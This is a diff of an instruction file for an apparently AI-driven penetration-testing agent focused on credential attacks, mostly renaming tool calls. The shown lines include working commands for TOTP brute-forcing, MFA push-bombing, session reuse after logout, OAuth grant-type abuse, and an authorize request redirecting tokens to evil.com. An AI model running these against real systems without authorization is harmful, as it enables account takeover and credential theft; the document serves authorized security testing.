@@ -22,7 +22,7 @@ When invoked from the pentester skill with discovered usernames, hashes, or cred
 
 1. **Parse the arguments** — extract: target IP/hostname, services list (e.g. `service=ssh,ftp,http`), user list path (e.g. `userlist=/tmp/discovered-users.txt`), and any context about how the material was discovered.
 
-2. **Load the discovered user list** (if provided) — read the file via `kali_exec` (`cat /tmp/discovered-users.txt`). These are **confirmed usernames** on the target system — they take priority over generic wordlists.
+2. **Load the discovered user list** (if provided) — read the file via `kali(command=...)` (`cat /tmp/discovered-users.txt`). These are **confirmed usernames** on the target system — they take priority over generic wordlists.
 
 3. **If NO user list was provided**: run Phase 2.1 (platform-aware username expansion) IMMEDIATELY to build `/tmp/spray-users.txt`. This is critical — even without a discovered user list, the expanded list includes common first names and platform-specific accounts that catch weak credentials like `anne:princess` that generic shortlists miss entirely.
 
@@ -49,17 +49,17 @@ When invoked from the pentester skill with discovered usernames, hashes, or cred
 
 | Tool | Use for |
 |------|---------|
-| `start_scan` | Define target, scope, depth, and hard limits — **always call this first** |
-| `complete_scan` | Mark the scan done and write final notes |
-| `run_nuclei` | Default credential templates — fast check for known default logins |
-| `run_nmap` | Service detection — identify auth-enabled services |
-| `kali_exec` | Kali tools: hydra, john, ncrack, medusa, cewl, crunch, hashcat, netexec, kerbrute, impacket |
-| `http_request` | Raw HTTP — manual auth testing, cookie analysis, OAuth flows. Set `poc=True` for confirmed exploits |
-| `save_poc` | Save a confirmed exploit as a raw `.http` file in `pocs/` |
-| `report_finding` | Log a confirmed vulnerability with evidence to findings.json |
-| `report_diagram` | Save a Mermaid diagram to findings.json |
-| `start_dashboard` | Serve dashboard.html at localhost:5000 |
-| `log_note` | Write a reasoning note or decision to the session log |
+| `session(action="start", options={...})` | Define target, scope, depth, and hard limits — **always call this first** |
+| `session(action="complete", options={...})` | Mark the scan done and write final notes |
+| `scan(tool="nuclei", ...)` | Default credential templates — fast check for known default logins |
+| `scan(tool="nmap", ...)` | Service detection — identify auth-enabled services |
+| `kali(command=...)` | Kali tools: hydra, john, ncrack, medusa, cewl, crunch, hashcat, netexec, kerbrute, impacket |
+| `http(action="request", ...)` | Raw HTTP — manual auth testing, cookie analysis, OAuth flows. Set `poc=True` for confirmed exploits |
+| `http(action="save_poc", ...)` | Save a confirmed exploit as a raw `.http` file in `pocs/` |
+| `report(action="finding", data={...})` | Log a confirmed vulnerability with evidence to findings.json |
+| `report(action="diagram", data={...})` | Save a Mermaid diagram to findings.json |
+| `report(action="dashboard", data={"port": 5000})` | Serve dashboard.html at localhost:5000 |
+| `report(action="note", data={...})` | Write a reasoning note or decision to the session log |
 
 ---
 
@@ -74,10 +74,10 @@ When invoked from the pentester skill with discovered usernames, hashes, or cred
 | **Default Credentials** | T1078.001 | `nuclei`, `hydra` |
 | **Credential in Files** | T1552.001 | `trufflehog`, `grep` |
 | **Kerberos Attacks** | T1558 | `impacket`, `kerbrute`, `john` |
-| **MFA Bypass** | T1111 | `http_request`, manual |
-| **OAuth/OIDC Abuse** | T1550.001 | `http_request`, `kali_exec` |
-| **Timing Enumeration** | T1589.001 | `http_request`, `kali_exec` |
-| **Session Token Analysis** | T1539 | `kali_exec`, `http_request` |
+| **MFA Bypass** | T1111 | `http(action="request", ...)`, manual |
+| **OAuth/OIDC Abuse** | T1550.001 | `http(action="request", ...)`, `kali(command=...)` |
+| **Timing Enumeration** | T1589.001 | `http(action="request", ...)`, `kali(command=...)` |
+| **Session Token Analysis** | T1539 | `kali(command=...)`, `http(action="request", ...)` |
 
 ---
 
@@ -107,9 +107,9 @@ If depth/service is unspecified, ask:
 
 ### Phase 0 — Scope & Setup
 
-0. `start_scan` with target, depth, limits
-1. `start_dashboard`
-2. `log_note` — record target services, known usernames, auth mechanisms
+0. `session(action="start", options={...})` with target, depth, limits
+1. `report(action="dashboard", data={"port": 5000})`
+2. `report(action="note", data={...})` — record target services, known usernames, auth mechanisms
 
 ---
 
@@ -120,9 +120,9 @@ If depth/service is unspecified, ask:
    scan(tool="nmap", target=HOST, options={"ports": "21,22,23,25,80,88,110,143,389,443,445,636,993,1433,3306,3389,5432,5900,6379,8080,8443,27017"})
    ```
 
-2. **Probe web auth** via `http_request`: find login pages, identify auth type (form/basic/bearer/OAuth/SAML), check for CAPTCHA, note error messages ("Invalid username" vs "Invalid credentials" = user enumeration)
+2. **Probe web auth** via `http(action="request", ...)`: find login pages, identify auth type (form/basic/bearer/OAuth/SAML), check for CAPTCHA, note error messages ("Invalid username" vs "Invalid credentials" = user enumeration)
 
-3. `log_note` + `report_diagram` with auth architecture (login form, auth service, DB, LDAP, MFA, OAuth paths)
+3. `report(action="note", data={...})` + `report(action="diagram", data={...})` with auth architecture (login form, auth service, DB, LDAP, MFA, OAuth paths)
 
 ---
 
@@ -356,7 +356,7 @@ kali(command="for proto in smb rdp ssh winrm mssql; do echo \"=== $proto ===\"; 
 
 **Services not in netexec**: use hydra for PostgreSQL (`postgres`), Oracle (`oracle-listener`), HTTP Basic (`http-get /admin`), HTTP POST form.
 
-Call `report_finding` immediately for every working credential pair.
+Call `report(action="finding", data={...})` immediately for every working credential pair.
 
 ---
 
@@ -378,7 +378,7 @@ Call `report_finding` immediately for every working credential pair.
 **Key commands:**
 ```
 # Technique 1: omit OTP field entirely
-http_request(url="https://TARGET/api/auth/verify", method="POST", body={"username": "user", "password": "pass"})
+http(action="request", url="https://TARGET/api/auth/verify", method="POST", body={"username": "user", "password": "pass"})
 
 # Technique 3: TOTP brute-force
 kali(command="for code in $(seq -w 000000 000100); do RESP=$(curl -s -o /dev/null -w '%{http_code}' -X POST https://TARGET/api/verify-mfa -d \"{\\\"code\\\":\\\"$code\\\"}\" -H 'Content-Type: application/json' -H 'Cookie: session=TOKEN'); echo \"$code: $RESP\"; [ \"$RESP\" = \"200\" ] && break; done")
@@ -387,8 +387,8 @@ kali(command="for code in $(seq -w 000000 000100); do RESP=$(curl -s -o /dev/nul
 kali(command="for i in $(seq 1 20); do curl -s -X POST https://TARGET/api/push-mfa -d '{\"username\":\"target_user\"}' -H 'Content-Type: application/json'; sleep 3; done")
 
 # Technique 6: session reuse after logout
-http_request(url="https://TARGET/api/logout", method="POST", headers={"Cookie": "session=MFA_TOKEN"})
-http_request(url="https://TARGET/api/dashboard", method="GET", headers={"Cookie": "session=MFA_TOKEN"})
+http(action="request", url="https://TARGET/api/logout", method="POST", headers={"Cookie": "session=MFA_TOKEN"})
+http(action="request", url="https://TARGET/api/dashboard", method="GET", headers={"Cookie": "session=MFA_TOKEN"})
 ```
 
 ---
@@ -398,11 +398,11 @@ http_request(url="https://TARGET/api/dashboard", method="GET", headers={"Cookie"
 **Grant type confusion** — test if server accepts unintended grants:
 ```
 # ROPC (should be disabled): bypasses user interaction
-http_request(url="https://TARGET/oauth/token", method="POST", body={"grant_type": "password", "username": "admin", "password": "admin", "client_id": "CLIENT_ID"})
+http(action="request", url="https://TARGET/oauth/token", method="POST", body={"grant_type": "password", "username": "admin", "password": "admin", "client_id": "CLIENT_ID"})
 # client_credentials: may issue tokens without user context
-http_request(url="https://TARGET/oauth/token", method="POST", body={"grant_type": "client_credentials", "client_id": "CLIENT_ID", "client_secret": "SECRET"})
+http(action="request", url="https://TARGET/oauth/token", method="POST", body={"grant_type": "client_credentials", "client_id": "CLIENT_ID", "client_secret": "SECRET"})
 # implicit (deprecated): direct token in URL fragment
-http_request(url="https://TARGET/oauth/authorize?response_type=token&client_id=CLIENT_ID&redirect_uri=https://evil.com/cb&scope=openid", method="GET")
+http(action="request", url="https://TARGET/oauth/authorize?response_type=token&client_id=CLIENT_ID&redirect_uri=https://evil.com/cb&scope=openid", method="GET")
 ```
 
 **Scope escalation** — request privileged scopes: `scope=openid+profile+admin+write+users:manage`
@@ -517,18 +517,18 @@ kali(command="kerbrute userenum --dc DC_IP -d DOMAIN /usr/share/seclists/Usernam
 
 For every confirmed finding:
 
-1. `log_note` — what was confirmed
+1. `report(action="note", data={...})` — what was confirmed
 2. Verify access — actually log in with discovered credentials
-3. `http_request(poc=True)` for web findings
-4. `save_poc` with descriptive title (e.g., `default-creds-admin`, `mfa-bypass-param-removal`, `oauth-scope-escalation`)
-5. `report_finding` — severity: Critical (admin/MFA bypass), High (user access/OAuth abuse), Medium (weak tokens/enumeration), Low (best practice gaps)
+3. `http(action="request", options={"poc": true})` for web findings
+4. `http(action="save_poc", ...)` with descriptive title (e.g., `default-creds-admin`, `mfa-bypass-param-removal`, `oauth-scope-escalation`)
+5. `report(action="finding", data={...})` — severity: Critical (admin/MFA bypass), High (user access/OAuth abuse), Medium (weak tokens/enumeration), Low (best practice gaps)
 
 ---
 
 ### Phase 13 — Report & Wrap-Up
 
-1. `report_diagram` — credential attack surface diagram
-2. `log_note` with summary:
+1. `report(action="diagram", data={...})` — credential attack surface diagram
+2. `report(action="note", data={...})` with summary:
 ```
 Credential Audit Summary:
   Default credentials:    [count] services — [findings]
@@ -542,7 +542,7 @@ Credential Audit Summary:
   Hash cracking:          [total] hashes — [cracked] cracked
   Kerberos:               [AS-REP/Kerberoast] — [findings]
 ```
-3. `complete_scan`
+3. `session(action="complete", options={...})`
 4. Invoke `/gh-export`
 
 ---
@@ -565,23 +565,23 @@ Credential Audit Summary:
 | `/post-exploit` | Valid credentials obtained — post-exploitation and lateral movement |
 | `/lateral-movement` | Credentials work across multiple services — test lateral movement paths |
 | `/analyze-cve` | Auth library has a known CVE — trace exploitability |
-| `/gh-export` | Always — after `complete_scan` |
+| `/gh-export` | Always — after `session(action="complete", options={...})` |
 
 ---
 
 ## Rules
 
-- **`start_scan` is mandatory** — never run any other tool before it
+- **`session(action="start", options={...})` is mandatory** — never run any other tool before it
 - **Batch independent tools in the same response** — they execute in parallel
-- When any tool returns a LIMIT message, stop immediately and call `complete_scan`
+- When any tool returns a LIMIT message, stop immediately and call `session(action="complete", options={...})`
 - **Detect lockout threshold BEFORE spraying** — binary search (Phase 3), then use `threshold - 1`
 - **Start with default credentials** — always test vendor defaults before brute-force
 - **Build custom wordlists** — cewl + john rules + mask attacks beat generic wordlists
 - **Spray over brute-force** — 2 passwords x 1000 users beats 1000 passwords x 1 user
 - **Test credential reuse cross-service** — every found credential pair must hit all discovered services
-- **Call `report_finding` for every confirmed credential** — include service, username, verified access
-- **For every confirmed exploit**: call `http_request(poc=True)` AND `save_poc`
-- **Use `log_note` liberally** — document reasoning for wordlist choices and attack strategy
+- **Call `report(action="finding", data={...})` for every confirmed credential** — include service, username, verified access
+- **For every confirmed exploit**: call `http(action="request", options={"poc": true})` AND `http(action="save_poc", ...)`
+- **Use `report(action="note", data={...})` liberally** — document reasoning for wordlist choices and attack strategy
 - **Never fabricate findings** — only report credentials you actually verified
 - **Mermaid syntax rules**: `flowchart TD`, quote labels, no em-dashes, short alphanumeric node IDs
-- Call `stop_kali` at the end if `kali_exec` was used
+- Call `session(action="stop_kali")` at the end if `kali(command=...)` was used
